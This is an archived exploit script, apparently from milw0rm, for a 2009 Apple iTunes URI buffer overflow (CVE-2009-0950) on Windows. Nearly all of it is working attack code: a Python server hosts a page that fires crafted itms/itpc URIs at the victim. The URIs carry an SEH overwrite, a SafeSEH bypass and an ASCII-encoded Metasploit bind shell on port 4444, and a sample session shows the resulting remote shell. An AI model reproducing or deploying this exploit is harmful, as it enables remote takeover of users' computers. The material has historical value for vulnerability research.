<html><head><title>Apple iTunes 8.1.1.10 (itms/itcp) Remote Buffer Overflow Exploit (win)</title></head><pre>#!/usr/bin/python
# Apple iTunes 8.1.1.10 itms/itcp BOF Windows Exploit
# www.offensive-security.com/blog/vulndev/itunes-exploitation-case-study/
# Matteo Memelli | ryujin __A-T__ offensive-security.com
# Spaghetti &amp; Pwnsauce - 06/10/2009 
# CVE-2009-0950 http://dvlabs.tippingpoint.com/advisory/TPTI-09-03
#
# Vulnerability can't be exploited simply overwriting a return address on the
# stack because of stack  canary protection. Increasing buffer  size leads to
# SEH overwrite but it seems that the Access Violation needed to get  our own
# Exception Handler called is not always thrown.
# So, to increase reliability, the exploit sends two URI to iTunes:
# - the 1st payload corrupts the stack (it doesnt overwrite cookie, no crash)
# - the 2nd payload fully overwrite SEH to 0wN EIP
# Payloads must be encoded in order to obtain pure ASCII printable shellcode.
# I could trigger the  vulnerability from  Firefox but not from IE that seems
# to truncate the long URI.
# Tested on Windows XP SP2/SP3 English, Firefox 3.0.10, 
# iTunes 8.1.1.10, 8.1.0.52
#
# --&gt; hola hola ziplock, my Apple Guru! ;) &amp;&amp; cheers to muts... he knows why
#
# ryujin:Desktop ryujin$ ./ipwn.py 
# [+] iTunes 8.1.10 URI Bof Exploit Windows Version CVE-2009-0950
# [+] Matteo Memelli aka ryujin __A-T__ offensive-security.com
# [+] www.offensive-security.com
# [+] Spaghetti &amp; Pwnsauce
# [+] Listening on port 80
# [+] Connection accepted from: 172.16.30.7
# [+] Payload sent, wait 20 secs for iTunes error!
# ryujin:Desktop ryujin$ nc -v 172.16.30.7 4444
# Connection to 172.16.30.7 4444 port [tcp/krb524] succeeded!
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# 
# C:\Program Files\Mozilla Firefox&gt; 

from socket import *

html = &quot;&quot;&quot;
&lt;html&gt;
  &lt;head&gt;&lt;title&gt;iTunes loading . . .&lt;/title&gt;
  &lt;script&gt;
   function openiTunes(){document.location.assign(&quot;itms://itunes.apple.com/&quot;);}
   function prepareStack(){document.location.assign(&quot;%s&quot;);}
   function ownSeh(){document.location.assign(&quot;%s&quot;);}
   function ipwn(){
    prepareStack();
    ownSeh();
   }
   function main() {
    openiTunes();
    // Increase this timeout if your iTunes takes more time to load!
    setTimeout('ipwn()',20000);
   }
  &lt;/script&gt;
  &lt;/head&gt;
  &lt;body onload=&quot;main();&quot;&gt;
    &lt;p align=&quot;center&quot;&gt;
    &lt;b&gt;iTunes 8.1.1.10 URI Bof Exploit Windows Version CVE-2009-0950&lt;/b&gt;
    &lt;/p&gt;
    &lt;p align=&quot;center&quot;&gt;&lt;b&gt;ryujin __ A-T __ offensive-security.com&lt;/b&gt;&lt;/p&gt;
    &lt;p align=&quot;center&quot;&gt;&lt;b&gt;www.offensive-security.com&lt;/b&gt;&lt;/p&gt;
    &lt;p align=&quot;center&quot;&gt;
    iTunes starting... wait for 20 secs; if you get an error, click &quot;Ok&quot;
    in the MessageBox before checking for your shell on port 4444 :)&lt;br/&gt;
    If victim host is not connected to the internet, exploit will fail
    unless iTunes is already opened and you disable &quot;openiTunes&quot; javascript
    function.
    &lt;br/&gt;
    &lt;h2 align=&quot;center&quot;&gt;
    &lt;b&gt;&lt;u&gt;This exploit works if opened from Firefox not from IE!&lt;/u&gt;&lt;/b&gt;
    &lt;/h2&gt;
    &lt;p align=&quot;center&quot;&gt;
    After exploitation iTunes crashes, you need to kill it from TaskManager
    &lt;br/&gt;have fun!&lt;/br&gt;
    &lt;/p&gt;
    &lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;&quot;&quot;&quot;

# Alpha2 ASCII  printable  Shellcode  730 Bytes, via  EDX (0x60,0x40 Badchar)
# This is not standard Alpha2 bind shell. Beginning of shellcode  is modified
# in order to obtain register alignment and to  reset ESP and EBP we  mangled
# before. Rest of decoded shellcode is Metasploit  bind  shell  on  port 4444
# EXITFUNC=thread
# 
shellcode = (&quot;VVVVVVVVVVVVVVVVV7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIOqhDahIoS0&quot;
             &quot;5QnaJLS1uQVaeQcdcm2ePESuW5susuPEsuilazJKRmixHykOkOKOCPLKPlUtu&quot;
             &quot;tnkRegLLKSLfepx31zOlK2o7hlKqOEpWqZK3ylKwDLKeQHndqo0j9llOt9P3D&quot;
             &quot;uW9Q8J4MWqkrJKkDukPTWTq845M5LKQOq4VajKcVLKTLPKlKQOUL6ajK336LL&quot;
             &quot;KMY0lWTwle1O3TqiK2DLKaSFPLKQPVllK0p7lLmlK3pUXQNU8LNbnvnjL0PkO&quot;
             &quot;8V2Fv3U61xds02U8RWpsVRqO649on0PhjkZMYlekpPKOKfsoMYkUpfna8mgxV&quot;
             &quot;b65RJuRIoHPPhHYFiL5lmBwkOzvpSPSV3F3bsg3BsSsScIohPsVRHR1sl2Fcc&quot;
             &quot;k9M1nuphOT6zppIWrwKO8VcZ6ppQv5KO8PBHmtNMvNm9QGKON6aCqEkOZpbHZ&quot;
             &quot;EbiNfRiSgioiFRpf40TseiohPLSu8KWD9kvPyf7YoxVqEKOxPu6sZpd3VSX1s&quot;
             &quot;0mK98ecZRpv9Q9ZlMYkWqzpDmYxbTqO0KCoZKNaRVMkN3r6LJ3NmpzFXNKNKL&quot;
             &quot;ksX0rkNls5FkOrURdioXVSk67PRPQsapQCZgqbq0QSesaKOxPaxNMZyEUjnCc&quot;
             &quot;KOn6qzKOkOtwKOJpNk67YlMSKtcTyozvrryozp0hXoZnYp1p0SkOXVKOHPA&quot;)
# Padding
pad0x1          = &quot;\x41&quot;*425

# Make EDX pointing to shellcode and &quot;pray&quot; sh3llcod3 M@cumBa w00t w00t
align           = &quot;\x61&quot;*45 + &quot;\x54\x5A&quot; + &quot;\x42&quot;*6 + &quot;V&quot;*10

# Padding
pad0x2          = &quot;\x41&quot;*570                                   

# ASCII friendly RET overwriting SEH: bye bye canary, tweet tweet
# 0x67215e2a QuickTime.qts ADD ESP,8;RETN (SafeSEH bypass)
ret             = &quot;\x2a\x5e\x21\x67&quot;

# Let the dance begin... Point EBP to encoded jmp                                                               
align_for_jmp   = &quot;\x61\x45\x45\x45&quot; + ret + &quot;\x44&quot; + &quot;\x45&quot;*7

# Decode a NEAR JMP and JUMP BACK BABY!
jmp_back        = (&quot;UYCCCCCCIIIIIIIIII7QZjAXP0A0AkA&quot;
                   &quot;AQ2AB2BB0BBABXP8ABuJIZIE5jZKOKOA&quot;)
# Padding
pad0x3          = &quot;\x43&quot;*162                                   

# We send 2 payloads to iTunes: first is itms and second itpc
# url1 smashes the stack in order to get an AV later
url1            = &quot;itms://:&quot; + &quot;\x41&quot;*200 + &quot;/&quot; 
url2            = &quot;itpc://:&quot; + pad0x1 + align + shellcode +pad0x2 +\
                               align_for_jmp + jmp_back + pad0x3 
payload         = html % (url1, url2)

print &quot;[+] iTunes 8.1.1.10 URI Bof Exploit Windows Version CVE-2009-0950&quot;
print &quot;[+] Matteo Memelli aka ryujin __A-T__ offensive-security.com&quot;
print &quot;[+] www.offensive-security.com&quot;
print &quot;[+] Spaghetti &amp; Pwnsauce&quot;
s = socket(AF_INET, SOCK_STREAM)
s.bind((&quot;0.0.0.0&quot;, 80))
s.listen(1)
print &quot;[+] Listening on port 80&quot;
c, addr = s.accept()
print &quot;[+] Connection accepted from: %s&quot; % (addr[0])
c.recv(1024)
c.send(payload)
print &quot;[+] Payload sent, wait 20 secs for iTunes error!&quot;
c.close()
s.close()

# milw0rm.com [2009-06-12]</pre></html>